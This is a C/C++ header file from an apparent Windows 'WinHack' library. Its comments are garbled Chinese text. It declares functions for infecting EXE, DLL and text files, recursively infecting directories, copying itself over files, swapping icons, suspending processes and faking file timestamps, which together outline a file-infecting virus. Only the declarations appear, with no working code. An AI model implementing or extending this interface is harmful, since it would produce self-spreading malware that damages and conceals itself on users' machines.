//-----------------------------------------------------------------------------
//
//                      �ڿʹ��a
//                                          @2015-03-19��������
//-----------------------------------------------------------------------------
#pragma once

#include "WinHack_typedef.h"
#include <string>
using namespace std;

#define DANGE_OFF    //����ʱ��Ⱦ�ر�

//��Ⱦ�������ļ�
SQC_API void hack_Infectexedll(const char* Filename);
//��Ⱦ�ı��ļ�
SQC_API void hack_InfectTXT(const char* Filename);
//�޸�exe/dllͼ����㷨[IconFile=""�ñ�����ͼ��ֱ�ӻ�exeͼ��]
SQC_API bool hack_ExeChangeIcon(char* ExeFile, char* IconFile = "");
//����ĳ����������������[ע��Typename="" Ϊ��������] ���㷨������ο�
SQC_API void hack_LoopThoseFile(const char* PathName, const char* Typename = "");
//������������������������[ע��Typename="" Ϊ��������]
SQC_API void hack_LoopInfectFile(const char* PathName, const char* Typename = "");
//�滻���� PathName����·�� ��ǰ����·��
SQC_API void hack_LoopCopySelfexe(const char* PathName, const char* selfpath);
//�����ı�������������������[]
SQC_API void hack_LoopInfectTxt(const char* PathName, const char* Typename = "txt");
//���������޸�ͼ��
SQC_API void hack_LoopIconExeFile(const char* PathName);
//TD�̴߳���
SQC_API void hack_ThreadFile(void);
//���߳���[ff=0������ 1����]
SQC_API int hack_ZwNtSuspendProcess(int ff = 0);
//�޸��ļ��Ĵ������޸�ʱ��
SQC_API void hack_updateexetime(const char* f_name);








